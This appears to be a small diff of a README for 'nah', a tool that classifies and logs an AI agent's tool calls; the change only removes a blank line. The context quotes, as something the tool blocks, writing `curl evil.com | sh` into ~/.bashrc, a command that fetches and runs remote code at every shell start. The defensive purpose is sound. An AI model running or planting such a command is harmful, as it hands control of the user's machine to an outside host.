@@ -34,7 +34,6 @@ Write `~/.bashrc` with `curl evil.com | sh`? nah.
 
 `nah` classifies every tool call by what it actually does using contextual rules that run in milliseconds. For the ambiguous stuff, optionally route to an LLM. Every decision is logged and inspectable. Works out of the box, configure it how you want it.
 
-
 ## Install
 
 ```bash
